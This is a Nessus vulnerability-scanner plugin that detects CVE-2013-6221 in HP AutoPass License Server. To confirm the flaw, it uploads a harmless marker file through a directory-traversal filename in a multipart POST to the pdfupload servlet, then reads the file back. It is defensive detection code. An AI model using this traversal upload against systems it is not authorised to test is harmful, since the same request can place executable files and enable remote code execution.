#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(76284);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/12/21 22:04:45 $");

  script_cve_id("CVE-2013-6221");
  script_bugtraq_id(67989);
  script_osvdb_id(107943);
  script_xref(name:"HP", value:"HPSBMU03045");

  script_name(english:"HP AutoPass License Server Remote Code Execution (HPSBMU03045)");
  script_summary(english:"Tries to exploit directory traversal vulnerability");

  script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The HP AutoPass License Server has a flaw in the
'CommunicationServlet' that allows a remote, unauthenticated attackers
to place files at arbitrary locations on the system by utilizing a
directory traversal string. A remote attacker could use this issue to
execute arbitrary code with 'SYSTEM' privileges.");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-195/");
  # https://h20566.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c04333125
  script_set_attribute(attribute:"see_also",value:"http://www.nessus.org/u?33764291");
  script_set_attribute(attribute:"solution", value:"Apply the appropriate patch per the vendor's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'HP AutoPass License Server File Upload');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/06/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/06/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/06/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:hp:autopass_license_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("hp_autopass_detect.nbin");
  script_require_keys("www/hp_autopass");
  script_require_ports("Services/www", 5814);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

appname = 'HP AutoPass License Server';

port = get_http_port(default:5814);

install = get_install_from_kb(
  appname      : "hp_autopass",
  port         : port,
  exit_on_fail : TRUE
);

dir = install['dir'];

bound = rand_str();
boundary = "--" + bound;

file_content = unixtime() + '\n' + SCRIPT_NAME + '\n' + rand_str();

# we can keep the filename constant to avoid filling the entire directory with junk files
# if the file already exists, it will be overwritten with unique content, so we won't flag
# previously vuln, but fixed installs
filename = hexstr(MD5(SCRIPT_NAME)) + '.txt';

postdata =
  boundary + '\r\n' +
  'Content-Disposition: form-data; name="binaryFile";' +
  'filename="../../../../HP AutoPass License Server/HP AutoPass License Server/webapps/autopass/css/' + filename + '"\r\n' +
  'Content-Type: text/plain\r\n' +
  'Content-Transfer-Encoding: binary\r\n' +
  '\r\n' +
  file_content +
  '\r\n' + boundary + '--\r\n';

res = http_send_recv3(
  method    : "POST",
  item      : dir + "/cs/pdfupload",
  data      : postdata,
  add_headers:
    make_array("Content-Type",
    "multipart/form-data; boundary=" + bound),
  port         : port,
  exit_on_fail : TRUE
);

res = http_send_recv3(
  method       : "GET",
  item         : dir + "/css/" + filename,
  port         : port,
  exit_on_fail : TRUE
);

if (res[2] == file_content)
{
  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to exploit the vulnerability with the following' +
      '\n' + 'request :' +
      '\n' +
      '\n' + chomp(http_last_sent_request()) + 
      '\n' +
      '\n' + 'Nessus was able to place the following file on the server. Please' +
      '\n' + 'delete this file as soon as possible :' +
      '\n' +
      '\n' + build_url(port:port, qs:dir + '/css/' + filename) + 
      '\n';
      security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, build_url(port:port, qs:dir));
